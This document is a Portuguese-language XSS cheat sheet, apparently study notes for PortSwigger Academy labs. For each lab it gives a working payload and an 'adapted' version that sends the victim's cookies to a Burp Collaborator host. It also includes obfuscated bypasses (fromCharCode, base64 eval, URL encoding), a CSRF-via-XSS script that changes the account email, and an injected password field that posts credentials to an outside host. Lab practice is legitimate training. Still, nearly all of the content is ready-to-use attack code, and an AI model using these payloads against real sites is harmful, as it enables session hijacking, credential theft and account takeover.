# XSS - Cross-Site Scripting

Se você ver um campo de busca (search) ou um seção de comentários, busque por XSS.

Se tudo estiver sendo encodado, provavelmente o parâmetro não está vulnerável a XSS.

Payload genérico para XSS:
```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

<br>

Encontrou XSS?

Adapte o payload para roubar o cookie da vítima, por exemplo:

Em vez:
```
<script>alert(1)</script>
```

Teste com:
```
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

> [!TIP]
> Pratique essa adaptação de payload nos labs. Se o cookie estiver com a flag HTTPOnly ativada, o payload com `document.cookie` não vai funcionar. Remova esse trecho e teste enviando uma request qualquer para o Collaborator para ver se a estrutura está correta.

<br>

## Laboratórios

> [!NOTE]  
> Alguns payloads finais não estão encodados em URL. Lembre de fazer isso caso ele não funcione sem encodar.

<br>

**DOM XSS in document.write sink using source location.search inside a select element**
```
storeId=test"></select><script>alert(1)</script>
```

Versão adaptada:
```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

<br>

**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
```
{{constructor.constructor('alert(1)')()}}

OU

{{$on.constructor('alert(1)')()}}
```

Versão adaptada:
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

<br>

**Reflected DOM XSS**
```
\"-alert()}//
```

Versão adaptada:
```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```

<br>

**Stored DOM XSS**

A função vulnerável remove somente os primeiros angle brackets.
```
<><img src=1 onerror=alert(1)>
```

Versão adaptada:
```
<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">
```

<br>

**Exploiting cross-site scripting to steal cookies**
```
<script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
```

<br>

**Exploiting XSS to perform CSRF**
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() 
{    
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];    
var changeReq = new XMLHttpRequest();    
changeReq.open('post', '/my-account/change-email', true);    
changeReq.send('csrf='+token+'&email=test@test.com')};
</script>
```

<br>

**Reflected XSS into HTML context with most tags and attributes blocked**

Utilize o Intruder para testar todas as tags utilizando [esse cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

Depois de descobrir a tag, faça o mesmo processo para os eventos.
```
<iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Versão adaptada:
```
<script>
location = 'https://exploit-server.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>
```

<br>

**Reflected XSS into HTML context with all tags blocked except custom ones**
```
<script>
location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

Versão adaptada:
```
<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x
```

<br>

**Reflected XSS with some SVG markup allowed**
```
<svg><animatetransform onbegin=alert(1)> 
```

Versão adaptada:
```
<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;>
```

<br>

**Reflected XSS in canonical link tag**
```
'accesskey='x'onclick='alert(1)
```

<br>

**Reflected XSS into a JavaScript string with single quote and backslash escaped**
```
</script><script>alert(1)</script>
```

Versão adaptada:
```
</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
```

<br>

**Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**
```
\';alert(1);//
\'-alert(1)//
```

Versão adaptada:
```
\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//
```

<br>

**Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**
```
http://foo?&apos;-alert(1)-&apos;
```

<br>

**Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**
```
${alert(document.cookie)}
```

<br>

## Alguns Bypasses Úteis
```
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >
```

Caso a aplicação detecte o payload como perigoso:
```
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

Versões adaptadas:
```
# Normal
fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])

# Em Base64
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//

# Encodado em URL e Base64
<script>
location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%59%47%68%30%64%48%42%7a%4f%69%38%76%4e%48%6f%30%59%57%64%6c%4d%48%6c%77%59%6a%56%33%62%32%49%35%63%44%59%78%65%58%42%77%64%54%45%7a%64%6e%55%78%62%48%42%69%5a%44%41%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%70%7a%62%32%35%6a%50%57%41%67%4b%79%42%33%61%57%35%6b%62%33%64%62%49%6d%52%76%59%33%56%74%5a%57%35%30%49%6c%31%62%49%6d%4e%76%62%32%74%70%5a%53%4a%64%4b%51%3d%3d%22%29%29%2d%22"
</script>
```

<br>

### Outros
```
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>

<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
```

Exploiting cross-site scripting to capture passwords
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://4x28nlhnbd0yv9of913vlou6cxio6gu5.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
